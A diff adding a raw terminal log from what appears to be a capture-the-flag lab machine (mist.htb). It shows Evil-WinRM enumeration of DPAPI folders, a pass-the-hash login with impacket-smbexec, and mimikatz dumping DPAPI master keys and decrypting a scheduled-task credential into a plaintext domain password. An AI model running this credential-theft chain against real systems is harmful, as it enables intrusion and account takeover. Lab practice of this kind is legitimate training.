@@ -1,0 +1,223 @@
+
+*Evil-WinRM* PS C:\Users\Administrator\AppData\Local\Microsoft\Credentials> ls -Force C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+
+    Directory: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         3/10/2024   3:03 AM            576 8ACB3F386FC64AC7AE6425BF58E4398A
+-a-hs-         2/20/2024   5:51 AM          11104 DFBE70A7E5CC19A398EBF1B96859CE5D
+
+*Evil-WinRM* PS C:\Users\Administrator\AppData\Local\Microsoft\Credentials> ls -Force C:\Windows\System32\Microsoft\Protect\S-1-5-18
+
+
+    Directory: C:\Windows\System32\Microsoft\Protect\S-1-5-18
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d---s-         2/24/2024   5:06 AM                User
+-a-hs-         2/20/2024   5:42 AM            468 b683cbf0-4e92-4557-a4ca-9565b8ca5de2
+-a-hs-         2/20/2024   5:42 AM            468 b9c6f503-aaec-4794-bf94-4811197425f7
+-a-hs-         9/21/2026  11:53 AM            468 f1e8e89c-0a4d-4ffd-b526-9c97b07ef4c6
+-a-hs-         9/21/2026  11:53 AM             24 Preferred
+
+*Evil-WinRM* PS C:\Users\Administrator> ls -Force C:\Windows\System32\Microsoft\Protect\S-1-5-18\User
+
+
+    Directory: C:\Windows\System32\Microsoft\Protect\S-1-5-18\User
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         2/20/2024   5:42 AM            468 2118510f-eb77-4a38-ac7e-1610ee6d9d48
+-a-hs-         9/21/2026   1:18 PM            468 441ebbd8-fffa-40b6-b2bd-6c9d396142cf
+-a-hs-         2/20/2024   5:42 AM            468 53395925-5fc5-4a66-bde3-ac12cbfabac0
+-a-hs-         2/24/2024   5:06 AM             32 Diagnostic
+-a-hs-         9/21/2026   1:18 PM             24 Preferred
+
+❯ proxychains4 -q impacket-smbexec administrator@ms01.mist.htb -hashes :711e6a685af1c31c4029c3c7681dd97b
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>C:\xampp\htdocs\herramientas\mimikatz.exe "sekurlsa::dpapi" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # sekurlsa::dpapi
+
+Authentication Id : 0 ; 68342 (00000000:00010af6)
+Session           : Service from 0
+User Name         : svc_web
+Domain            : MS01
+Logon Server      : MS01
+Logon Time        : 9/21/2026 11:53:49 AM
+SID               : S-1-5-21-1075431363-3458046882-2723919965-1000
+	[00000000]
+	* GUID      :	{5de26a1e-073d-4f5c-bc8e-f97b2d3ccfcd}
+	* Time      :	9/21/2026 12:08:53 PM
+	* MasterKey :	1843202a59184c82b31a343bc9593f6d07c3913427859a1245b8c5d91b2d207c746496441f9885a22329fe4e66a575ebea9c506cfab006b437da2d635d9567ec
+	* sha1(key) :	7c32fdec8e8e640b9373df0411cf2a47f860c9d8
+
+
+Authentication Id : 0 ; 43942 (00000000:0000aba6)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/21/2026 11:53:44 AM
+SID               : S-1-5-90-0-1
+
+
+Authentication Id : 0 ; 43896 (00000000:0000ab78)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/21/2026 11:53:44 AM
+SID               : S-1-5-90-0-1
+
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MS01$
+Domain            : MIST
+Logon Server      : (null)
+Logon Time        : 9/21/2026 11:53:43 AM
+SID               : S-1-5-20
+
+
+Authentication Id : 0 ; 25976 (00000000:00006578)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/21/2026 11:53:43 AM
+SID               : S-1-5-96-0-0
+
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/21/2026 11:53:44 AM
+SID               : S-1-5-19
+
+
+Authentication Id : 0 ; 25947 (00000000:0000655b)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/21/2026 11:53:43 AM
+SID               : S-1-5-96-0-1
+
+
+Authentication Id : 0 ; 24788 (00000000:000060d4)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 9/21/2026 11:53:43 AM
+SID               : 
+
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MS01$
+Domain            : MIST
+Logon Server      : (null)
+Logon Time        : 9/21/2026 11:53:43 AM
+SID               : S-1-5-18
+	[00000000]
+	* GUID      :	{441ebbd8-fffa-40b6-b2bd-6c9d396142cf}
+	* Time      :	9/21/2026 1:25:12 PM
+	* MasterKey :	3357244d834789420b85fcd6e2dbbc47c68538204d4abe0886b81b1cc2ecb367e10cc86471ec5544f73600923c1bf39ba5b0a67b2787a212f87cad5c9e82fa31
+	* sha1(key) :	67659ec3cb16dfbca8b813b6e72d2250135b19a6
+	[00000001]
+	* GUID      :	{f1e8e89c-0a4d-4ffd-b526-9c97b07ef4c6}
+	* Time      :	9/21/2026 11:53:51 AM
+	* MasterKey :	9179b8006580bf2b8c1b43c7daa2d54d757e0f7784cc9ebf13cc825edf29a9b93a046653244d3783c39a63db830494f6aa58b99f823845d2a31b721ed48db366
+	* sha1(key) :	ae04dd38f6786f84109ab6bb1d11a43bd0d306ca
+	[00000002]
+	* GUID      :	{b9c6f503-aaec-4794-bf94-4811197425f7}
+	* Time      :	9/21/2026 11:53:50 AM
+	* MasterKey :	547db099ebec8df5c52ba72238517372af8f34afe8949be85239f1641eab0cb3dbf28e63fb42bbdbb8ec0ab7c2763a1f8bd31c0183e296ac82ab2280cb3b5f67
+	* sha1(key) :	19eb335e8d618ed07b9a671894f7979e12ca4601
+	[00000003]
+	* GUID      :	{53395925-5fc5-4a66-bde3-ac12cbfabac0}
+	* Time      :	9/21/2026 1:26:09 PM
+	* MasterKey :	77a5fab122cad3699af5f51d3d0365f0f1396b5ced8da8143d31f894db2b7821b70b8871b6e525b9aedb75afd9e316e553efec449cf6e4a0af8e6a9dae5e06ee
+	* sha1(key) :	a1569030214ebee795aebe395c7ab91080fb4d63
+
+
+mimikatz(commandline) # exit
+Bye!
+
+C:\Windows\system32>C:\xampp\htdocs\herramientas\mimikatz.exe "dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\8ACB3F386FC64AC7AE6425BF58E4398A /masterkey:77a5fab122cad3699af5f51d3d0365f0f1396b5ced8da8143d31f894db2b7821b70b8871b6e525b9aedb75afd9e316e553efec449cf6e4a0af8e6a9dae5e06ee" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\8ACB3F386FC64AC7AE6425BF58E4398A /masterkey:77a5fab122cad3699af5f51d3d0365f0f1396b5ced8da8143d31f894db2b7821b70b8871b6e525b9aedb75afd9e316e553efec449cf6e4a0af8e6a9dae5e06ee
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {53395925-5fc5-4a66-bde3-ac12cbfabac0}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000030 - 48
+  szDescription      : Local Credential Data
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : 00fe2d811ca7f7c514d91f8e1adbc9748ef873882fec3ba7e7ec6ada406638e3
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : 7ef79aa8cb5d6358ff107de59c5ce5ac0f967d8d5e5b9c1acccc7c89a83f385b
+  dwDataLen          : 00000130 - 304
+  pbData             : f852a3e34af12c5f0d2c1fc103cd837b1094f58dc685582ab9543fe932e19026ffc1a69390bd3d4b1fb1514be363b0aa6a0b925b5ff57350c184d77cf8439586162caa7120aff3f6b8f6154a6ceed9225d2f768ca58259f9a411ab4d6a4e8cb1cc3def97608f9910674381d5e646cd133c72834add91cde4883e53eff068bf0b5f2ae24b3ea0ea36284e4143f85610afe95f26a8de5cae8ca1419ac0f9ed6e84fc4cfb30cfbef5180d1e8dbfb7cd74bdbcade6f9db9086a561481dcf6e577b6bb9e06eec0c0989a30b13e9b80ff8abf8660c04ffbd05c4719da3a5b096c55be0fc13430c3787ee531aa104474336947a39a6b3c8967be7908531df7afaae6d1c618452cd48eb7b0bcf05ba5f061c1f6240eb32b6352cd1b8a16ce742ed707e57c95e76adedb7d0ba5becb2c0bba5dc6a
+  dwSignLen          : 00000040 - 64
+  pbSign             : 259edca6f442ce05143d6499b3a405f33eaffa8a947641afe1d930387bc35e0a5ce8c8ed82a7d41fd10a4de95efede53f5935549d85e8ec135373255a1fc123d
+
+Decrypting Credential:
+ * masterkey     : 77a5fab122cad3699af5f51d3d0365f0f1396b5ced8da8143d31f894db2b7821b70b8871b6e525b9aedb75afd9e316e553efec449cf6e4a0af8e6a9dae5e06ee
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 0000012e - 302
+  credUnk0       : 00004004 - 16388
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 3/10/2024 10:03:11 AM
+  unkFlagsOrSize : 00000030 - 48
+  Persist        : 00000002 - 2 - local_machine
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:batch=TaskScheduler:Task:{EB5DDFC5-0881-4B03-B860-3DB8588328D0}
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : MIST\Brandon.Keywarp
+  CredentialBlob : CoolFlipdColossalTitan1
+  Attributes     : 0
+
+mimikatz(commandline) # exit
+Bye!
